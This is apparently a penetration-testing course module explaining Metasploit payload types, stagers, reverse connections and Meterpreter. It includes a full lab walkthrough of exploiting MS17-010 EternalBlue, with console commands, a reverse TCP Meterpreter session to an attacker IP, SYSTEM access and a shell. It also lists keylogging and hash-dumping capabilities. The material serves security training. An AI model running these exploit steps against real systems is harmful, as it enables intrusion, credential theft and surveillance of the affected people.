# Metasploit Framework: Payloads

---

## Table of Contents

1. [What a payload actually is](#1-what-a-payload-actually-is)
2. [The three payload types: Singles, Stagers, Stages](#2-the-three-payload-types-singles-stagers-stages)
3. [How to tell them apart by name](#3-how-to-tell-them-apart-by-name)
4. [NX vs. NO-NX stagers](#4-nx-vs-no-nx-stagers)
5. [Why Stages exist and how they're delivered](#5-why-stages-exist-and-how-theyre-delivered)
6. [Why reverse connections tend to work better](#6-why-reverse-connections-tend-to-work-better)
7. [The Meterpreter payload](#7-the-meterpreter-payload)
8. [Searching for payloads](#8-searching-for-payloads)
9. [Selecting a payload](#9-selecting-a-payload)
10. [Full walkthrough: MS17-010 EternalBlue with Meterpreter](#10-full-walkthrough-ms17-010-eternalblue-with-meterpreter)
11. [Inside a Meterpreter session](#11-inside-a-meterpreter-session)
12. [Common payload types reference](#12-common-payload-types-reference)
13. [Cheat sheet](#13-cheat-sheet)

---

## 1. What a payload actually is

Recall the exploit/payload relationship from earlier parts:

- The **exploit** is the lockpick: it breaks the normal rules of the vulnerable service to get its foot in the door.
- The **payload** is what happens *after* that door opens: the actual code that runs on the target, usually to give the attacker a shell (a usable command line on the target).

So an exploit and a payload are sent **together**, but they have two separate jobs:

| Component | Job |
|---|---|
| **Exploit** | Breaks the service's normal behavior so attacker code can run |
| **Payload** | Runs on the target, typically phoning home to give the attacker a foothold |

---

## 2. The three payload types: Singles, Stagers, Stages

Metasploit offers three "flavors" of payload, each suited to different situations:

| Type | What it is |
|---|---|
| **Singles** | Fully self-contained. Contains everything needed, exploit interaction included, in one piece. |
| **Stagers** | A small, reliable piece of code that runs first and opens a connection back to you, ready to receive something bigger. |
| **Stages** | The "something bigger" a Stager downloads afterward — full-featured payloads like Meterpreter, with no real size limit. |

**Analogy:** think of ordering furniture online.

- A **Single** is like a fully-assembled chair showing up at your door — simple, nothing to put together, but the delivery truck has to be big enough to carry the whole thing.
- A **Stager** is like the delivery driver who first confirms "yes, someone's home and ready" — small and quick.
- A **Stage** is the actual flat-pack furniture delivered once that confirmation happens — much bigger and more capable, but it needed that first small step to arrive.

### Singles in more depth

- Contain the **entire** shellcode for the task in one piece.
- More **stable** by design because there's nothing to coordinate between separate pieces.
- Downside: they can get **large**, and some exploits can't fit a payload that big into the space they have available.
- Good for simple, immediate actions — e.g. adding a user account or starting a process.

### Stagers in more depth

- Designed to be **small and reliable**.
- Their only job is to set up the **communication channel** back to the attacker, so a Stage can be delivered next.
- Metasploit automatically picks the best stager for the situation, and falls back to a less ideal one if needed.

### Stages in more depth

- Downloaded **by** a stager, after the initial connection is live.
- Provide advanced, full-featured capability with **no size limits** — this is where things like **Meterpreter** and **VNC injection** live.

---

## 3. How to tell them apart by name

Whether a payload is staged or not is visible directly in its **name**, via the `/` separator:

| Example | Structure | Meaning |
|---|---|---|
| `windows/shell_bind_tcp` | `os/payload_name` | **Single** — no stage, self-contained |
| `windows/shell/bind_tcp` | `os/stage/stager` | **Staged** — `shell` is the Stage, `bind_tcp` is the Stager |

**Rule of thumb:** more `/` segments after the OS usually means a staged payload (stager + stage working together), while a single flat name (no extra `/`) usually means a self-contained Single.

---

## 4. NX vs. NO-NX stagers

This is a small but useful detail about Windows stagers specifically, related to a memory-protection feature called **DEP (Data Execution Prevention)**, which relies on the CPU's **NX bit** (No-eXecute) to stop code from running in memory regions that are only supposed to hold data.

| | NX Stagers | NO-NX Stagers |
|---|---|---|
| **Compatibility** | Work properly with DEP-protected (NX) CPUs | Can run into reliability issues on NX-protected CPUs |
| **Size** | Bigger (they allocate memory via `VirtualAlloc` to stay DEP-compliant) | Smaller |
| **Current default** | Yes — Metasploit now defaults to NX + Windows 7 compatible stagers | No |

**In plain terms:** modern Windows systems have memory protections (DEP) that can block older/smaller stagers from working reliably. The newer "NX" stagers are a bit bigger but are built to play nicely with those protections, which is why they're the current default.

---

## 5. Why Stages exist and how they're delivered

Stages solve a very practical networking problem: a single `recv()` network call can fail or truncate when the data being received is **too large**.

To work around that, staged payloads often go through a **middle stager**:

```
Stager (small)
     │
     ▼
Middle Stager  ───►  reliably performs the FULL download
     │
     ▼
Stage (big)  ───►  e.g. Meterpreter
```

This middle-stager approach is also friendlier for memory regions that are **RWX** (Readable, Writable, and eXecutable) — the kind of memory many payloads need to run from.

### Stage0: the first thing sent

The very first piece of shellcode sent to the vulnerable service is called **Stage0**. Its only job is to open a connection back to the attacker — this is the "reverse connection" concept from earlier parts. You'll recognize Stage0-style payloads by names like:

- `reverse_tcp`
- `reverse_https`
- `bind_tcp`

You can see a long list of these in `show payloads`:

```
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp         normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
538  windows/x64/meterpreter/bind_tcp               normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
541  windows/x64/meterpreter/reverse_http            normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https           normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
544  windows/x64/meterpreter/reverse_tcp             normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager

<SNIP>
```

### Stage1: the big payload

Once Stage0 has established a stable channel, the attacker's machine sends a **much bigger** payload — **Stage1** — which is what actually grants interactive shell access (e.g. a full Meterpreter session).

> **Design goal, always:** besides granting access, every payload tries to stay **compact and inconspicuous**, to help it slip past Antivirus (AV) and Intrusion Prevention Systems (IPS).

---

## 6. Why reverse connections tend to work better

**Reverse connections** (where the *target* calls out to the *attacker*) tend to succeed more often than **bind connections** (where the attacker connects *into* the target). Here's why:

- Firewalls are usually configured to be **strict about inbound traffic** but much more **permissive about outbound traffic**.
- Since the victim machine is the one *initiating* the connection, it looks like normal outbound activity, which many security devices place in a more trusted zone.

```
BIND connection:                      REVERSE connection:

  Attacker ───(inbound, blocked)──►     Attacker ◄──(outbound, usually allowed)── Target
             Target                                     
```

> **Caution:** this trust in outbound traffic isn't absolute. Security teams and devices can and do monitor outbound connections too, so an attacker still needs to be careful even when using reverse connections.

---

## 7. The Meterpreter payload

**Meterpreter** is Metasploit's flagship advanced payload. A few things make it special:

| Feature | Why it matters |
|---|---|
| **DLL injection** | Keeps the connection stable and harder to spot with simple checks |
| **Lives entirely in memory** | Leaves (almost) nothing on the hard drive, which makes traditional forensic/disk-based detection much harder |
| **Persistent across reboots/changes** | Designed to maintain its foothold reliably |
| **Dynamically loadable plugins/scripts** | You can load extra capability on the fly, without restarting the session |

Once Meterpreter runs successfully, it opens a **new session** and drops you into the **Meterpreter interface** — a console similar in feel to `msfconsole`, but every command targets the compromised machine instead.

**Capabilities include (non-exhaustive):**

- Capturing keystrokes
- Dumping password hashes
- Tapping the microphone
- Taking screenshots
- Impersonating process security tokens (acting as another user's process)

You can also extend Meterpreter with **plugins** (such as Mimikatz, for credential extraction) to speed up and automate parts of an assessment.

---

## 8. Searching for payloads

### Listing everything

```
msf6 > show payloads

Payloads
========

   #    Name                                   Disclosure Date  Rank    Check  Description
   -    ----                                   ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                   manual  No     AIX Command Shell, Bind TCP Inline
   4    android/meterpreter/reverse_http                         manual  No     Android Meterpreter, Android Reverse HTTP Stager
   ...
   557  windows/x64/vncinject/reverse_tcp                        manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
```

With hundreds of entries, scrolling through manually is slow. That's where `grep` comes in.

### Filtering with `grep`

`grep` can be chained in front of almost any msfconsole command to filter its output.

**Step 1: find everything with "meterpreter" in the name**

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp         normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   ...
   19  payload/windows/x64/meterpreter/reverse_winhttps       normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
```

Count the matches with `-c`:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14
```

**Step 2: chain another `grep` to narrow further (meterpreter AND reverse_tcp)**

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp             normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4         normal  No  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid        normal  No  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3
```

From 500+ payloads down to 3 relevant ones in two commands. `grep` works the same way with virtually any msfconsole command — you just need to know what keyword you're hunting for.

---

## 9. Selecting a payload

Just like modules, payloads are chosen by **index number**, using `set payload <no.>` — but only **after** you've already selected an exploit module.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)...
   RPORT          445              yes       The target port (TCP)
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

### New options appear after selecting a payload

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):
   ... (same as before) ...

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

**Handy detail:** because msfconsole already knows the exploit's target OS (Windows, in this case), running `show payloads` *from inside the module* automatically filters the list to only Windows-compatible payloads.

The key new fields to focus on: **`LHOST`** (your IP) and **`LPORT`** (the port you'll listen on for the reverse connection).

---

## 10. Full walkthrough: MS17-010 EternalBlue with Meterpreter

This builds directly on the MS17-010 example from Part 2 — same vulnerability family, but now swapping the default shell for a full **Meterpreter** payload.

### What needs to be set

| Module | Parameter | Meaning |
|---|---|---|
| Exploit | `RHOSTS` | The target machine's IP |
| Exploit | `RPORT` | Just confirm it's `445` (SMB) |
| Payload | `LHOST` | Your (attacker) IP |
| Payload | `LPORT` | Just confirm the port isn't already in use |

### Step 1: find your own IP from inside msfconsole

You don't even need to leave the console — `ifconfig` works directly:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > ifconfig

[*] exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500
<SNIP>
inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15
<SNIP>
```

### Step 2: set LHOST and RHOSTS

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

### Step 3: run it

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

**Reading this output:**

- Notice this time Metasploit runs the `smb_ms17_010` auxiliary **check** scanner automatically first to confirm vulnerability.
- `Sending stage (201283 bytes)` — that's **Stage1** (the full Meterpreter payload) being delivered, after the small Stage0 handshake already happened.
- `Meterpreter session 1 opened` confirms you now have an active, numbered session.

---

## 11. Inside a Meterpreter session

You're no longer at a standard Windows command prompt — you're inside the **Meterpreter interface**, which has its own command set.

### `whoami` doesn't exist here

```
meterpreter > whoami

[-] Unknown command: whoami.
```

Meterpreter uses Linux-style naming for some commands. The equivalent of `whoami` is `getuid`:

```
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

> `NT AUTHORITY\SYSTEM` is the highest privilege level on Windows (comparable to `root` on Linux).

### Exploring what's possible

```
meterpreter > help
```

This reveals a long list of capabilities — from pulling password hashes out of the SAM database, to screenshots, to webcam/microphone access — all from what feels like a Linux-style shell.

### Browsing the filesystem

```
meterpreter > cd Users
meterpreter > ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris
```

### Dropping into a real Windows shell

Sometimes you want the actual Windows command line instead of the Meterpreter interface. The `shell` command does this:

```
meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

### What "Channel 1" means

The **channel** represents the live connection between your machine and the target — in this case, the reverse TCP connection set up earlier by the Meterpreter stager/stage pair. Your stager was sitting and listening on your machine, waiting for the stage on the target to call back and complete the connection.

### Working inside the real shell

Same privilege level as before, just a different interface:

```
C:\Users>dir

 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users>whoami

nt authority\system
```

Here, `whoami` **does** work, because you're in a real Windows shell this time, not the Meterpreter interface.

---

## 12. Common payload types reference

A quick reference table for the most commonly used Windows payloads:

| Payload | Description |
|---|---|
| `generic/custom` | Generic, multi-use listener |
| `generic/shell_bind_tcp` | Generic listener, normal shell, binds a TCP port |
| `generic/shell_reverse_tcp` | Generic listener, normal shell, reverse TCP connection |
| `windows/x64/exec` | Executes a single arbitrary command (Windows x64) |
| `windows/x64/loadlibrary` | Loads an arbitrary x64 library path |
| `windows/x64/messagebox` | Pops up a dialog box with custom title/text/icon |
| `windows/x64/shell_reverse_tcp` | Normal shell, Single (not staged), reverse TCP |
| `windows/x64/shell/reverse_tcp` | Normal shell, Stager + Stage, reverse TCP |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, Stager + Stage, IPv6 bind TCP |
| `windows/x64/meterpreter/…` | Full Meterpreter payload, with the connection-method varieties above |
| `windows/x64/powershell/…` | Interactive PowerShell session, same varieties |
| `windows/x64/vncinject/…` | VNC server via reflective injection, same varieties |

> **Beyond Metasploit's built-ins:** **Empire** and **Cobalt Strike** are other heavily used professional payload frameworks. They're outside the scope of this module, but worth researching independently since they show up often in real-world, high-value engagements.

---

## 13. Cheat sheet

### Payload type summary

| Type | Self-contained? | Size | Typical use |
|---|---|---|---|
| **Single** | Yes | Can be large | Simple, immediate actions |
| **Stager** | No (needs a Stage) | Small | Opens the connection back |
| **Stage** | No (needs a Stager) | No real limit | Advanced capability (Meterpreter, VNC) |

### Key commands

| Command | Purpose |
|---|---|
| `show payloads` | List all available payloads (filtered to the target OS if a module is selected) |
| `grep <term> show payloads` | Filter payloads by keyword |
| `grep <term1> grep <term2> show payloads` | Chain filters for a narrower match |
| `grep -c <term> ...` | Count matches instead of listing them |
| `set payload <no.>` | Select a payload (after an exploit module is selected) |
| `ifconfig` | Check your own IP directly from msfconsole |
| `set LHOST <ip>` | Set your (attacker) IP for the payload |
| `set LPORT <port>` | Set the port you're listening on |

### Inside a Meterpreter session

| Command | Purpose |
|---|---|
| `help` | List all Meterpreter commands |
| `getuid` | Show current user (Meterpreter's equivalent of `whoami`) |
| `ls` / `cd` | Browse the target's filesystem |
| `shell` | Drop into a real OS command-line shell |
| `background` | Send the session to the background, back at msfconsole |

### Big-picture takeaways

1. **Exploit ≠ payload.** The exploit breaks in; the payload is what runs once it's in.
2. **Three payload types:** Singles (all-in-one), Stagers (small, open the channel), Stages (big, full capability).
3. **`/` in a payload name usually signals staging.** `os/payload` = Single, `os/stage/stager` = staged.
4. **Reverse connections generally work better** because outbound traffic is more trusted by firewalls — but this isn't foolproof.
5. **Meterpreter is Metasploit's flagship payload:** memory-resident, hard to detect on disk, extensible with plugins.
6. **`grep` is your friend** for narrowing hundreds of payloads down to the few that matter.
7. **Meterpreter has its own command set**, and some familiar Windows commands (like `whoami`) don't exist there — use `getuid` instead, or drop into `shell` for the real thing.

---
